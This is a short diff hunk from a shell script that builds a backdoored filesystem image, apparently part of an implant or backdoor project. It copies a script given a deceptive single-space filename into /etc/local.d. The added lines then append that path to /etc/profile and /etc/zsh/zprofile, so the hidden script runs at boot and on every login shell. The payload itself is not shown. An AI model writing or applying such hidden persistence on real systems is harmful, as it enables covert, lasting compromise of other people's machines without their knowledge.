@@ -108,6 +108,9 @@ sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
 # I guess I wasn't too creative here... a million ways to do this, I picked the simplest one I could think of.
 cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '
+
+echo "/etc/local.d/' '" >> ./backdoor-squash/etc/profile
+echo "/etc/local.d/' '" >> ./backdoor-squash/etc/zsh/zprofile
 echo '#local.d place holder' > ./backdoor-squash/etc/local.d/local.start
 echo '/etc/local.d/ ' > ./backdoor-squash/etc/local.d/local.start
 chmod a+x ./backdoor-squash/etc/local.d/local.start
